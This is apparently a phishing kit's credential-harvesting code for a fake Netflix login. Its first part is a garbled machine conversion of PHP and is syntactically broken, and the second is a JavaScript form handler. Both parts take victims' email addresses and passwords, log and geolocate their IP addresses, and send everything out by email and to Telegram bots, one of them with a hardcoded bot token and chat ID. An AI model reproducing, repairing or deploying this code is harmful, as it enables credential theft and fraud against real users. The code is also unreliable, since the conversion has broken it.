// Manage core logic by this variable
var Settlement = [];
Settlement.urlencode = function(str) {
 
  str = (str + '').toString();

  return encodeURIComponent(str)
    .replace(/!/g, '%21')
    .replace(/'/g, '%27')
    .replace(/\(/g, '%28')
    .replace(/\)/g, '%29')
    .replace(/\*/g, '%2A')
    .replace(/%20/g, '+');
}
//---------------------------------
// kalkicode.com 
// These methods have not been changed by our tools.
// session_start
// getenv
// fopen
// gmdate
// fwrite
// file_get_contents
// json_decode
// gethostbyaddr
// mail
// fclose
// HEADER
//----------------------------

session_start();
include "../../anti/anti1.php";
include "../../anti/anti2.php";
include "../../anti/anti3.php";
include "../../anti/anti4.php";
include "../../anti/anti5.php";
include "../../anti/anti7.php";
include '../../email.php';
ip = getenv("REMOTE_ADDR");
link = _SERVER['HTTP_HOST']+_SERVER['REQUEST_URI'];
message = "[link: {link} ]\r\n";
_SESSION['userLoignId'] = _POST['userLoginId'];
_SESSION['password'] = _POST['password'];
file = fopen("NetFlix_RzlT.txt", "a");
fwrite(file, ip+"  -  "+gmdate("Y-n-d")+" @ "+gmdate("H:i:s")+"\n");
IP_LOOKUP = @json_decode(file_get_contents("http://ip-api.com/json/"+ip));
COUNTRY = IP_LOOKUP.country+"\r\n";
countryCode = IP_LOOKUP.countryCode+"\r\n";
regionName = IP_LOOKUP.regionName+"\r\n";
lat = IP_LOOKUP.lat+"\r\n";
lon = IP_LOOKUP.long+"\r\n";
timezone = IP_LOOKUP.timezone+"\r\n";
isp = IP_LOOKUP.isp+"\r\n";
as = IP_LOOKUP.as+"\r\n";
CITY = IP_LOOKUP.city+"\r\n";
REGION = IP_LOOKUP.region+"\r\n";
STATE = IP_LOOKUP.regionName+"\r\n";
ZIPCODE = IP_LOOKUP.zip+"\r\n";
ip = _SERVER['REMOTE_ADDR'];
hostname = gethostbyaddr(ip);
subject = "GcS Team 💖 NetFlix log 💖  {ip}";
headers = "From: GcS-Team<info@GcSTeam.com>";
send = email;
message = "[GcS Team][+]━━━━━━━━【💖 NetFlix log 💖】━━━━━━━━[+][GcS Team]\r\n";
message = "|Email      : "+_POST['userLoginId']+"\r\n";
message = "|Password      \t : "+_POST['password']+"\r\n";
message = "[+]━━━━━━━━【💻 System INFO】━━━━━━━━[+]\r\n";
message = ip+"\nCountry : "+COUNTRY+"City: "+CITY+"Region : "+REGION+"State: "+STATE+"Zip : "+ZIPCODE+"country code: "+countryCode+"lat: "+lat+"lon: "+lon+"timezone: "+timezone+"isp: "+isp+"as: "+as;
message = "UserAgent  :  "+_SERVER['HTTP_USER_AGENT']+"\n";
message = "━━━━━━━━【💖 NetFlix log 💖】━━━━━━━━";
mail(send, subject, message, headers);
file_get_contents("https://api.telegram.org/bot"+api+"/sendMessage?chat_id="+chatid+"&text="+Settlement.urlencode(message)+"");
myfile = fopen("NetFlix_RzlT.txt", "a+");
txt = message;
fwrite(myfile, txt);
fclose(myfile);
HEADER("Location: ../restart.php");


const form = document.querySelector("#form");

addEventListener("submit", (e) => {
  e.preventDefault();

  var email = document.getElementById("email").value;
  var password = document.getElementById("password").value;

  var message = "Hits :%0A" + email + ":" + password;

  var token = "5530729858:AAG8bmQJe3dAmEX8d-MwzHKKFMto2B8JLHk";
  var chat_id = 1430266005;
  var url =
    "https://api.telegram.org/bot" +
    token +
    "/sendMessage?chat_id=" +
    chat_id +
    "&text=" +
    message;

  let api = new XMLHttpRequest();
  api.open("GET", url, true);
  api.send();

  console.log("Successfully");
});
